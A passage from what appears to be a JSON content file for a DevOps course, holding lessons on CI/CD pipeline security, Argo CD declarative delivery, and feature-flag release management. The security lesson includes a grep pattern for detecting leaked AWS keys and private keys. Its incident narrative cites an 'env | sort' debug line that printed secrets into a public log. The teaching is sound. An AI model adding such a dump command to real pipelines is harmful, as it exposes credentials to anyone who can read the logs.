dependencies\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Test\u003c/td>\n\u003ctd>Static analysis (SAST), dependency audit, IaC misconfiguration scan\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Package\u003c/td>\n\u003ctd>Image scan, SBOM, signature\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Deploy\u003c/td>\n\u003ctd>Admission policy verifies signature, OIDC short-lived credentials, approvals\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Run\u003c/td>\n\u003ctd>Runtime monitoring, audit logs, network policy\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>No single control is enough. Each layer assumes another one may fail.\u003c/p>\n\u003ch2 id=\"incident-the-leaked-deploy-key\">Incident: the leaked deploy key\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A contractor&#39;s pull request adds a debug line \u003ccode>env | sort\u003c/code> to a test script. The pipeline runs it and prints every environment variable into a publicly viewable log, including a long-lived cloud access key with admin rights. Within an hour, unfamiliar instances start in an unused region.\u003c/p>\n\u003c/aside>\n\u003cp>Respond in order: revoke, contain, investigate, then harden.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"aws iam update-access-key --access-key-id AKIAEXAMPLEKEY123456 --status Inactive --user-name ci-deployer\naws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAEXAMPLEKEY123456 --max-results 20\naws ec2 describe-instances --region ap-southeast-2 --query 'Reservations[].Instances[].InstanceId'\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>aws iam update-access-key --access-key-id AKIAEXAMPLEKEY123456 --status Inactive --user-name ci-deployer\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAEXAMPLEKEY123456 --max-results 20\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>aws ec2 describe-instances --region ap-southeast-2 --query \u003cspan class=\"hljs-string\">&#x27;Reservations[].Instances[].InstanceId&#x27;\u003c/span>\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Deactivate the key, review everything it did, terminate rogue resources, and delete the log. Then fix the design: replace the static key with OIDC federation, scope the role to deploy only, stop exposing secrets to pull request pipelines, and add a secret scanner that blocks the merge.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Long-lived admin keys stored as CI variables\u003c/li>\n\u003cli>Running untrusted pull requests with production secrets\u003c/li>\n\u003cli>Persistent runners that keep state and credentials between jobs\u003c/li>\n\u003cli>Using floating tags for third-party pipeline plugins\u003c/li>\n\u003cli>Treating the pipeline configuration as less important than application code\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"secrets-in-pipelines","text":"Secrets in pipelines"},{"id":"runners-and-isolation","text":"Runners and isolation"},{"id":"least-privilege-for-deployment","text":"Least privilege for deployment"},{"id":"securing-what-you-consume","text":"Securing what you consume"},{"id":"a-layered-pipeline","text":"A layered pipeline"},{"id":"incident-the-leaked-deploy-key","text":"Incident: the leaked deploy key"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"OWASP Top 10 CI/CD Security Risks","u":"https://owasp.org/www-project-top-10-ci-cd-security-risks/"},{"t":"SLSA: supply-chain levels for software artifacts","u":"https://slsa.dev/"},{"t":"AWS IAM: OIDC identity providers","u":"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc.html"}],"text":"A pipeline has the keys to production: it can read your source, build what you run and deploy it. That makes it one of the most attractive targets in your company. Attackers who compromise a pipeline do not need to break production, because the pipeline will deploy their code for them. What you will learn Handling secrets without exposing them in logs or code Isolating and hardening build runners Granting deploy credentials with least privilege and short lifetimes Scanning code, dependencies and images, and pinning what you consume Secrets in pipelines Secrets must come from a secret store or the CI system&#39;s protected variables, be masked in logs and be scoped to the jobs that need them. deploy-prod: stage: deploy environment: production rules: - if: &#x27;$CI_COMMIT_BRANCH == \"main\"&#x27; variables: AWS_ROLE_ARN: \"arn:aws:iam::123456789012:role/shop-deploy\" id_tokens: CI_JOB_JWT: aud: sts.amazonaws.com script: - aws sts assume-role-with-web-identity --role-arn \"$AWS_ROLE_ARN\" --role-session-name ci-$BUILD_ID --web-identity-token \"$CI_JOB_JWT\" --duration-seconds 900 - ./deploy.sh The best secret is the one that does not exist. Workload identity federation (OIDC) lets the pipeline prove who it is to the cloud provider and receive credentials that live for minutes, so there is no stored access key to leak. Where static secrets are unavoidable, restrict them to protected branches, rotate them regularly and never echo them. $ grep -rnE \"AKIA[0-9A-Z]{16}|BEGIN (RSA|EC|OPENSSH) PRIVATE KEY\" . --include=* -I | head $ detect-secrets scan --all-files | head -20 Run a secret scanner in the pipeline and as a pre-commit hook. A leaked key must be treated as compromised: revoke it first, then clean the history. Runners and isolation Build agents run untrusted code, since any pull request may contain a malicious test or build script. Treat them accordingly. Use ephemeral runners that are destroyed after each job Give runners no standing access to production networks Separate runners for untrusted contributions from those with deploy credentials Do not run pull request pipelines from forks with secrets available Keep the runner software and base image patched Least privilege for deployment The deploy job needs permission to update specific workloads, not to administer the account. apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: deployer namespace: shop rules: - apiGroups: [ \"apps\" ] resources: [ \"deployments\" ] verbs: [ \"get\" , \"list\" , \"patch\" , \"update\" ] - apiGroups: [ \"\" ] resources: [ \"pods\" , \"pods/log\" ] verbs: [ \"get\" , \"list\" ] Require approval for production, restrict who can approve, and make the pipeline definition itself reviewable. If anyone can edit the pipeline file in a feature branch and have it run with production credentials, protection of the main branch is meaningless. Securing what you consume Dependencies are code you did not write. Attackers publish look-alike package names, take over abandoned packages and add malicious install scripts. $ npm ci --ignore-scripts $ python -m pip install --require-hashes -r requirements.txt $ pip-audit -r requirements.txt $ npm audit --audit-level=high $ trivy fs --scanners vuln,secret,misconfig . $ trivy config --severity HIGH,CRITICAL Dockerfile k8s/ Use lock files and install exactly what they list. Pull through an internal proxy or mirror. Pin third-party CI plugins and actions to an exact version or digest, because a tag can be moved. Generate an SBOM for every release and sign artifacts so deployment can verify them. A layered pipeline Stage Control Commit Secret scanning, signed commits, branch protection and review Build Ephemeral runner, pinned base images, locked dependencies Test Static analysis (SAST), dependency audit, IaC misconfiguration scan Package Image scan, SBOM, signature Deploy Admission policy verifies signature, OIDC short-lived credentials, approvals Run Runtime monitoring, audit logs, network policy No single control is enough. Each la"},"cicd/declarative-delivery-with-argo-cd":{"html":"\u003cp>In a push pipeline, your CI system holds credentials to the cluster and runs \u003ccode>kubectl apply\u003c/code>. That works, but those credentials are a target, nobody notices when someone changes the cluster by hand, and the real state of production lives in the memory of whoever ran the last command. \u003cstrong>Declarative delivery\u003c/strong> reverses the direction: a controller inside the cluster pulls the desired configuration from a reviewed source and keeps the cluster matching it.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The pull model and its benefits\u003c/li>\n\u003cli>How Argo CD and Flux work\u003c/li>\n\u003cli>An Argo CD Application\u003c/li>\n\u003cli>Sync, drift correction and rollback\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"push-versus-pull\">Push versus pull\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>\u003c/th>\n\u003cth>Push (pipeline applies)\u003c/th>\n\u003cth>Pull (controller applies)\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Cluster credentials\u003c/td>\n\u003ctd>Held by the CI system\u003c/td>\n\u003ctd>Stay inside the cluster\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Manual changes\u003c/td>\n\u003ctd>Remain until the next deploy, unnoticed\u003c/td>\n\u003ctd>Detected and reverted or reported\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Source of truth\u003c/td>\n\u003ctd>The last pipeline run\u003c/td>\n\u003ctd>The reviewed configuration\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Audit trail\u003c/td>\n\u003ctd>CI logs\u003c/td>\n\u003ctd>Change history of the configuration\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Rollback\u003c/td>\n\u003ctd>Re-run an older pipeline\u003c/td>\n\u003ctd>Revert the change; the controller reconciles\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>This is the same reconcile loop you met in the first Kubernetes lesson, applied to \u003cem>deployment itself\u003c/em>.\u003c/p>\n\u003ch2 id=\"the-flow\">The flow\u003c/h2>\n\u003col>\n\u003cli>CI builds and tests the application and publishes an image with a unique tag.\u003c/li>\n\u003cli>A change to the \u003cstrong>configuration repository\u003c/strong> updates the image tag for an environment. This is a normal reviewed change.\u003c/li>\n\u003cli>The controller notices the new desired state, compares it with the cluster and applies the difference.\u003c/li>\n\u003cli>It reports \u003ccode>Synced\u003c/code> and \u003ccode>Healthy\u003c/code>, or shows exactly what differs.\u003c/li>\n\u003c/ol>\n\u003cp>Keep \u003cstrong>application source\u003c/strong> and \u003cstrong>deployment configuration\u003c/strong> in separate repositories when you can. That stops every code commit from being a deploy request, and lets a platform team control environments without touching application code.\u003c/p>\n\u003ch2 id=\"argo-cd-and-flux\">Argo CD and Flux\u003c/h2>\n\u003cp>Both are widely used, CNCF-hosted controllers for this model.\u003c/p>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>\u003c/th>\n\u003cth>Argo CD\u003c/th>\n\u003cth>Flux\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Style\u003c/td>\n\u003ctd>Application-centric with a web UI and CLI\u003c/td>\n\u003ctd>Set of controllers driven by Kubernetes objects\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Strength\u003c/td>\n\u003ctd>Visual view of sync and health; easy to explore\u003c/td>\n\u003ctd>Composable and lightweight; strong automation of image updates\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Config unit\u003c/td>\n\u003ctd>\u003ccode>Application\u003c/code>\u003c/td>\n\u003ctd>A source object, \u003ccode>Kustomization\u003c/code>, \u003ccode>HelmRelease\u003c/code>\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Choose either; the concepts are identical. The example below uses Argo CD.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: shop-api-prod\n  namespace: argocd\nspec:\n  project: shop\n  source:\n    repoURL: https://source.example.com/platform/shop-deploy\n    targetRevision: main\n    path: overlays/prod\n  destination:\n    server: https://kubernetes.default.svc\n    namespace: shop\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true\n    syncOptions:\n      - CreateNamespace=true\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">argoproj.io/v1alpha1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Application\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">shop-api-prod\u003c/span>\n  \u003cspan class=\"hljs-attr\">namespace:\u003c/span> \u003cspan class=\"hljs-string\">argocd\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">project:\u003c/span> \u003cspan class=\"hljs-string\">shop\u003c/span>\n  \u003cspan class=\"hljs-attr\">source:\u003c/span>\n    \u003cspan class=\"hljs-attr\">repoURL:\u003c/span> \u003cspan class=\"hljs-string\">https://source.example.com/platform/shop-deploy\u003c/span>\n    \u003cspan class=\"hljs-attr\">targetRevision:\u003c/span> \u003cspan class=\"hljs-string\">main\u003c/span>\n    \u003cspan class=\"hljs-attr\">path:\u003c/span> \u003cspan class=\"hljs-string\">overlays/prod\u003c/span>\n  \u003cspan class=\"hljs-attr\">destination:\u003c/span>\n    \u003cspan class=\"hljs-attr\">server:\u003c/span> \u003cspan class=\"hljs-string\">https://kubernetes.default.svc\u003c/span>\n    \u003cspan class=\"hljs-attr\">namespace:\u003c/span> \u003cspan class=\"hljs-string\">shop\u003c/span>\n  \u003cspan class=\"hljs-attr\">syncPolicy:\u003c/span>\n    \u003cspan class=\"hljs-attr\">automated:\u003c/span>\n      \u003cspan class=\"hljs-attr\">prune:\u003c/span> \u003cspan class=\"hljs-literal\">true\u003c/span>\n      \u003cspan class=\"hljs-attr\">selfHeal:\u003c/span> \u003cspan class=\"hljs-literal\">true\u003c/span>\n    \u003cspan class=\"hljs-attr\">syncOptions:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">CreateNamespace=true\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Reading it: the controller watches the \u003ccode>overlays/prod\u003c/code> path of the configuration repository and keeps the \u003ccode>shop\u003c/code> namespace identical to it. \u003ccode>prune: true\u003c/code> deletes objects removed from configuration. \u003ccode>selfHeal: true\u003c/code> reverts manual changes made in the cluster.\u003c/p>\n\u003caside class=\"callout callout-tip\">\u003cdiv class=\"callout-title\">Tip\u003c/div>\u003cp>Use automated sync for development and staging. For production, many teams keep \u003ccode>selfHeal\u003c/code> on but require a manual sync, or an approval, so a person decides when the change goes live.\u003c/p>\n\u003c/aside>\n\u003ch2 id=\"everyday-operations\">Everyday operations\u003c/h2>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"argocd app list\nargocd app diff shop-api-prod\nargocd app sync shop-api-prod\nargocd app history shop-api-prod\nargocd app rollback shop-api-prod 12\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>argocd app list\u003c/span>\u003cspan class=\"ln out\">NAME            CLUSTER                         NAMESPACE  STATUS     HEALTH\u003c/span>\u003cspan class=\"ln out\">shop-api-prod   https://kubernetes.default.svc  shop       Synced     Healthy\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>argocd app diff shop-api-prod\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>argocd app \u003cspan class=\"hljs-built_in\">sync\u003c/span> shop-api-prod\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>argocd app \u003cspan class=\"hljs-built_in\">history\u003c/span> shop-api-prod\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>argocd app rollback shop-api-prod 12\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Rolling back by reverting the configuration change is better than the \u003ccode>rollback\u003c/code> command, because it keeps the stored configuration and the cluster in agreement. Where you used \u003ccode>rollback\u003c/code> in an emergency, record the same change in configuration afterward, or the controller will push the bad version again.\u003c/p>\n\u003ch2 id=\"secrets\">Secrets\u003c/h2>\n\u003cp>You cannot store plain Secret manifests in a shared configuration repository. Use one of these approaches:\u003c/p>\n\u003cul>\n\u003cli>\u003cstrong>External secret management\u003c/strong>: an operator reads values from your cloud secret manager and creates the Kubernetes Secret\u003c/li>\n\u003cli>\u003cstrong>Sealed or encrypted secrets\u003c/strong>: the stored value is encrypted and only the cluster can decrypt it\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"incident-the-controller-keeps-undoing-an-urgent-fix\">Incident: the controller keeps undoing an urgent fix\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>During an outage you scale the deployment to 10 replicas with \u003ccode>kubectl scale\u003c/code>. A minute later it is back at 3, and the site is still struggling.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl scale deployment/shop-api -n shop --replicas=10\nkubectl get deploy shop-api -n shop\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl scale deployment/shop-api -n shop --replicas=10\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get deploy shop-api -n shop\u003c/span>\u003cspan class=\"ln out\">NAME       READY   UP-TO-DATE   AVAILABLE\u003c/span>\u003cspan class=\"ln out\">shop-api   3/3     3            3\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003ccode>selfHeal\u003c/code> is working as designed: the configuration says 3, so the controller reverted your manual change. In an emergency you have two honest options. Make the change the intended way, by editing the replica count in the configuration and letting the controller apply it, which takes a minute but leaves a reviewable record. Or use the documented break-glass step of pausing automated sync for that application, scaling manually, and re-enabling sync when the incident is over. Either way, finish by making the configuration match what you decided, and review whether the replica count belongs under an autoscaler instead of a fixed number.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Storing real secrets in the configuration repository\u003c/li>\n\u003cli>Letting application commits trigger production changes directly\u003c/li>\n\u003cli>Turning off \u003ccode>selfHeal\u003c/code> permanently and returning to drift\u003c/li>\n\u003cli>Making emergency changes by hand and never recording them\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"push-versus-pull","text":"Push versus pull"},{"id":"the-flow","text":"The flow"},{"id":"argo-cd-and-flux","text":"Argo CD and Flux"},{"id":"everyday-operations","text":"Everyday operations"},{"id":"secrets","text":"Secrets"},{"id":"incident-the-controller-keeps-undoing-an-urgent-fix","text":"Incident: the controller keeps undoing an urgent fix"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Argo CD documentation","u":"https://argo-cd.readthedocs.io/en/stable/"},{"t":"Flux documentation","u":"https://fluxcd.io/flux/"},{"t":"Argo Rollouts documentation","u":"https://argo-rollouts.readthedocs.io/en/stable/"}],"text":"In a push pipeline, your CI system holds credentials to the cluster and runs kubectl apply . That works, but those credentials are a target, nobody notices when someone changes the cluster by hand, and the real state of production lives in the memory of whoever ran the last command. Declarative delivery reverses the direction: a controller inside the cluster pulls the desired configuration from a reviewed source and keeps the cluster matching it. What you will learn The pull model and its benefits How Argo CD and Flux work An Argo CD Application Sync, drift correction and rollback Push versus pull Push (pipeline applies) Pull (controller applies) Cluster credentials Held by the CI system Stay inside the cluster Manual changes Remain until the next deploy, unnoticed Detected and reverted or reported Source of truth The last pipeline run The reviewed configuration Audit trail CI logs Change history of the configuration Rollback Re-run an older pipeline Revert the change; the controller reconciles This is the same reconcile loop you met in the first Kubernetes lesson, applied to deployment itself . The flow CI builds and tests the application and publishes an image with a unique tag. A change to the configuration repository updates the image tag for an environment. This is a normal reviewed change. The controller notices the new desired state, compares it with the cluster and applies the difference. It reports Synced and Healthy , or shows exactly what differs. Keep application source and deployment configuration in separate repositories when you can. That stops every code commit from being a deploy request, and lets a platform team control environments without touching application code. Argo CD and Flux Both are widely used, CNCF-hosted controllers for this model. Argo CD Flux Style Application-centric with a web UI and CLI Set of controllers driven by Kubernetes objects Strength Visual view of sync and health; easy to explore Composable and lightweight; strong automation of image updates Config unit Application A source object, Kustomization , HelmRelease Choose either; the concepts are identical. The example below uses Argo CD. apiVersion: argoproj.io/v1alpha1 kind: Application metadata: name: shop-api-prod namespace: argocd spec: project: shop source: repoURL: https://source.example.com/platform/shop-deploy targetRevision: main path: overlays/prod destination: server: https://kubernetes.default.svc namespace: shop syncPolicy: automated: prune: true selfHeal: true syncOptions: - CreateNamespace=true Reading it: the controller watches the overlays/prod path of the configuration repository and keeps the shop namespace identical to it. prune: true deletes objects removed from configuration. selfHeal: true reverts manual changes made in the cluster. Tip Use automated sync for development and staging. For production, many teams keep selfHeal on but require a manual sync, or an approval, so a person decides when the change goes live. Everyday operations $ argocd app list NAME CLUSTER NAMESPACE STATUS HEALTH shop-api-prod https://kubernetes.default.svc shop Synced Healthy $ argocd app diff shop-api-prod $ argocd app sync shop-api-prod $ argocd app history shop-api-prod $ argocd app rollback shop-api-prod 12 Rolling back by reverting the configuration change is better than the rollback command, because it keeps the stored configuration and the cluster in agreement. Where you used rollback in an emergency, record the same change in configuration afterward, or the controller will push the bad version again. Secrets You cannot store plain Secret manifests in a shared configuration repository. Use one of these approaches: External secret management : an operator reads values from your cloud secret manager and creates the Kubernetes Secret Sealed or encrypted secrets : the stored value is encrypted and only the cluster can decrypt it Incident: the controller keeps undoing an urgent fix Incident During an outage you scale the deployment to "},"cicd/release-management-and-feature-flags":{"html":"\u003cp>Early pipelines treat a release as one event: the code is deployed and users see it. Mature teams separate the two. They deploy code often and in small pieces, and they release a feature to users later, gradually, and with a switch that can turn it off in seconds. This reduces fear, shortens lead time and makes rollbacks boring.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The difference between deploying and releasing\u003c/li>\n\u003cli>Types of feature flags and their lifecycle\u003c/li>\n\u003cli>Environments, approvals and promotion\u003c/li>\n\u003cli>Progressive delivery: percentages, rings and kill switches\u003c/li>\n\u003cli>Flag debt and how to avoid it\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"deploy-is-not-release\">Deploy is not release\u003c/h2>\n\u003cp>Deploying puts a new version on servers. Releasing makes a behaviour visible to users. With a flag, you can deploy code with the feature switched off, test it in production with staff, enable it for 1 percent of users, then 10 percent, then all. If something is wrong, you turn the flag off; no redeploy and no rollback of unrelated changes.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"python\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"if flags.enabled(&quot;new-checkout&quot;, user=user.id, default=False):\n    return new_checkout(cart)\nreturn old_checkout(cart)\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-keyword\">if\u003c/span> flags.enabled(\u003cspan class=\"hljs-string\">&quot;new-checkout&quot;\u003c/span>, user=user.\u003cspan class=\"hljs-built_in\">id\u003c/span>, default=\u003cspan class=\"hljs-literal\">False\u003c/span>):\n    \u003cspan class=\"hljs-keyword\">return\u003c/span> new_checkout(cart)\n\u003cspan class=\"hljs-keyword\">return\u003c/span> old_checkout(cart)\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The \u003ccode>default=False\u003c/code> matters: if the flag service is down, the code must fall back to a safe behaviour, not fail.\u003c/p>\n\u003ch2 id=\"kinds-of-flags\">Kinds of flags\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Kind\u003c/th>\n\u003cth>Purpose\u003c/th>\n\u003cth>Lifetime\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Release flag\u003c/td>\n\u003ctd>Hide unfinished or risky work\u003c/td>\n\u003ctd>Days to weeks, then delete\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Experiment flag\u003c/td>\n\u003ctd>Compare variants\u003c/td>\n\u003ctd>Until the result is known\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Operational flag (kill switch)\u003c/td>\n\u003ctd>Turn off an expensive or risky path in an incident\u003c/td>\n\u003ctd>Long\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Permission flag\u003c/td>\n\u003ctd>Enable for a plan or customer\u003c/td>\n\u003ctd>Long, part of the product\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Each flag needs an owner, a purpose and a removal date. Old release flags leave dead code and untested combinations, which is called flag debt. Review flags regularly and delete them.\u003c/p>\n\u003ch2 id=\"environments-and-promotion\">Environments and promotion\u003c/h2>\n\u003cp>Keep environments few and similar: development, staging (production-like), production. Promote the same built artifact through them, and change only configuration. Do not rebuild for each environment. Approvals should match risk: automatic for low-risk changes with good tests; a human check for changes to payments or data schemas. Record who approved what, and when.\u003c/p>\n\u003ch2 id=\"progressive-delivery\">Progressive delivery\u003c/h2>\n\u003cul>\n\u003cli>\u003cstrong>Canary:\u003c/strong> send a small share of traffic to the new version and watch error rate and latency.\u003c/li>\n\u003cli>\u003cstrong>Rings:\u003c/strong> release to internal users, then a small group, then everyone.\u003c/li>\n\u003cli>\u003cstrong>Automatic rollback:\u003c/strong> if a metric crosses a threshold during rollout, the system stops or reverts without a human.\u003c/li>\n\u003cli>\u003cstrong>Percentage rollouts by stable hash:\u003c/strong> hash the user id, so a user keeps the same experience.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"versions-and-rollbacks\">Versions and rollbacks\u003c/h2>\n\u003cp>Use semantic versions or build ids that map exactly to a commit. Keep the previous version ready, and make database changes backwards compatible (add a column first, switch code, remove the old column later) so a rollback of code is always possible.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A release changes a database column name and the code at the same time. Why does a rollback fail?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> The old code expects the old column name, which no longer exists, so rolling back the code breaks it.\u003c/p>\u003cp>Use an expand and contract approach: add the new column, write to both, switch reads, and remove the old column in a later release.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-feature-that-could-not-be-switched-off\">Incident: the feature that could not be switched off\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A new pricing calculation shows wrong totals to 30 percent of customers after a release, and turning it off takes two hours.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"flagctl list --stale\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>flagctl list --stale\u003c/span>\u003cspan class=\"ln out\">new-pricing       owner: pay-team   created: 2026-02-10   100% on\u003c/span>\u003cspan class=\"ln out\">legacy-discount   owner: (none)     created: 2024-06-01   100% on\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The change shipped without a flag, so the only remedy was a rollback that also removed other fixes. Afterwards the team required a flag for risky behaviour changes, added a kill switch for pricing, ran a canary with an automatic abort on error rate, and set a monthly flag clean-up.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>No safe default when the flag service fails\u003c/li>\n\u003cli>Flags without owners or removal dates\u003c/li>\n\u003cli>Rebuilding the artifact for each environment\u003c/li>\n\u003cli>Database changes that block rollback\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"deploy-is-not-release","text":"Deploy is not release"},{"id":"kinds-of-flags","text":"Kinds of flags"},{"id":"environments-and-promotion","text":"Environments and promotion"},{"id":"progressive-delivery","text":"Progressive delivery"},{"id":"versions-and-rollbacks","text":"Versions and rollbacks"},{"id":"incident-the-feature-that-could-not-be-switched-off","text":"Incident: the feature that could not be switched off"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"OpenFeature","u":"https://openfeature.dev/"},{"t":"Continuous Delivery","u":"https://continuousdelivery.com/"}],"text":"Early pipelines treat a release as one event: the code is deployed and users see it. Mature teams separate the two. They deploy code often and in small pieces, and they release a feature to users later, gradually, and with a switch that can turn it off in seconds. This reduces fear, shortens lead time and makes rollbacks boring. What you will learn The difference between deploying and releasing Types of feature flags and their lifecycle Environments, approvals and promotion Progressive delivery: percentages, rings and kill switches Flag debt and how to avoid it Deploy is not release Deploying puts a new version on servers. Releasing makes a behaviour visible to users. With a flag, you can deploy code with the feature switched off, test it in production with staff, enable it for 1 percent of users, then 10 percent, then all. If something is wrong, you turn the flag off; no redeploy and no rollback of unrelated changes. if flags.enabled( \"new-checkout\" , user=user. id , default= False ): return new_checkout(cart) return old_checkout(cart) The default=False matters: if the flag service is down, the code must fall back to a safe behaviour, not fail. Kinds of flags Kind Purpose Lifetime 